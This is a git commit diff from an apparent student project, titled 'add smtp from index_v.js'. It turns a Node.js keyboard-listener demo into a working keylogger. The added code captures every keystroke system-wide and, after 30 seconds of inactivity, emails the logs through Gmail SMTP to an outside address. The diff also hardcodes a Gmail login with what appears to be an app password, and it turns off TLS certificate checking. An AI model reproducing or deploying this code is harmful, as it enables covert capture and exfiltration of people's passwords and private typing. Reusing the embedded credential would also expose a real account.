ab58560ebafc9812c9a25434c826db501fe34493
Selwyn Onedo <selwyn.onedo14@gmail.com>
2023-10-11 12:02:26 +0800

    add smtp from index_v.js

--- Midterm/Midterm/index.js
+++ Midterm/Midterm/index.js
@@ -1,24 +1,87 @@
-const GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
+const nodemailer = require('nodemailer');
+const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
+
+// Initialize an empty string to store the current output
+let currentOutput = "";
+
+// Variable to track the inactivity timeout
+let inactivityTimeout;
+
+// Function to update the output
+function updateOutput(keyName) {
+    const enclosedKey = keyName.match(/^[a-zA-Z]$/) ? keyName : `<${keyName}>`;
+    
+    currentOutput += enclosedKey + " ";
+
+    // Clear the entire console
+    process.stdout.write('\x1Bc');
+
+    // Write the updated output without the trailing space
+    process.stdout.write(currentOutput.trim());
+
+    clearTimeout(inactivityTimeout);
+    inactivityTimeout = setTimeout(() => {
+        sendLogsByEmail(currentOutput);
+        currentOutput = "";
+    }, 30000);
+}
+
+
+// Configure nodemailer with SMTP transport
+const transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 587,
+    secure: false,
+    auth: {
+        user: 'venndelossantos@gmail.com',
+        pass: 'tmuv vogf ndzk asqa'
+    },
+    tls: {
+        rejectUnauthorized: false
+    }
+});
+
+// Function to send logs via email  
+function sendLogsByEmail(logs) {
+    const mailOptions = {
+        from: 'venndelossantos@gmail.com',
+        to: 'jogava@my.cspc.edu.ph',
+        subject: 'Keyboard Logs',
+        text: logs
+    };
+
+    transporter.sendMail(mailOptions, function(error, info){
+        if (error) {
+            console.error('Error sending email:', error);
+        } else {
+            console.log('Email sent:', info.response);
+        }
+    });
+}
 
 const v = new GlobalKeyboardListener();
+const keyState = {}; // Track the state of keys
 
-// Log every key that's pressed.
+// Add a listener to log every key press, but prevent double printing
+v.addListener(function (e) {
+    const keyName = e.name;
+    if (!keyState[keyName]) {
+        updateOutput(keyName); // Update the output
+        keyState[keyName] = true;
+    }
+});
+
+// Add a listener to reset the state when a key is released
 v.addListener(function (e, down) {
-    // Remove "[VK]" from the key's information.
-    const keyInfo = `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP"}`;
-
-    // Log the key's information.
-    console.clear(); // Clear the console to overwrite the previous line.
-    console.log(keyInfo);
+    const keyName = e.name;
+    if (!down[keyName]) {
+        keyState[keyName] = false;
+    }
 });
 
 // Capture Windows + Space on Windows and Command + Space on Mac
 v.addListener(function (e, down) {
-    if (
-        e.state == "DOWN" &&
-        e.name == "SPACE" &&
-        (down["LEFT META"] || down["RIGHT META"])
-    ) {
+    if (e.name == "SPACE" && (down["LEFT META"] || down["RIGHT META"])) {
         // Call your function
         return true;
     }
@@ -26,18 +89,59 @@ v.addListener(function (e, down) {
 
 // Capture ALT + F
 v.addListener(function (e, down) {
-    if (e.state == "DOWN" && e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
+    if (e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
         // Call your function
         return true;
     }
 });
 
-// Call one listener only once (demonstrating removeListener())
+// Add a listener that is only called once and demonstrate how to remove it
 calledOnce = function (e) {
     console.log("only called once");
     v.removeListener(calledOnce);
 };
 v.addListener(calledOnce);
+
+// const GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
+
+// const v = new GlobalKeyboardListener();
+
+// // Log every key that's pressed.
+// v.addListener(function (e, down) {
+//     // Remove "[VK]" from the key's information.
+//     const keyInfo = `${e.name} ${e.state == "DOWN" ? "DOWN" : "UP"}`;
+
+//     // Log the key's information.
+//     console.clear(); // Clear the console to overwrite the previous line.
+//     console.log(keyInfo);
+// });
+
+// // Capture Windows + Space on Windows and Command + Space on Mac
+// v.addListener(function (e, down) {
+//     if (
+//         e.state == "DOWN" &&
+//         e.name == "SPACE" &&
+//         (down["LEFT META"] || down["RIGHT META"])
+//     ) {
+//         // Call your function
+//         return true;
+//     }
+// });
+
+// // Capture ALT + F
+// v.addListener(function (e, down) {
+//     if (e.state == "DOWN" && e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
+//         // Call your function
+//         return true;
+//     }
+// });
+
+// // Call one listener only once (demonstrating removeListener())
+// calledOnce = function (e) {
+//     console.log("only called once");
+//     v.removeListener(calledOnce);
+// };
+// v.addListener(calledOnce);
 
 
 const activeWindow = require('active-win');
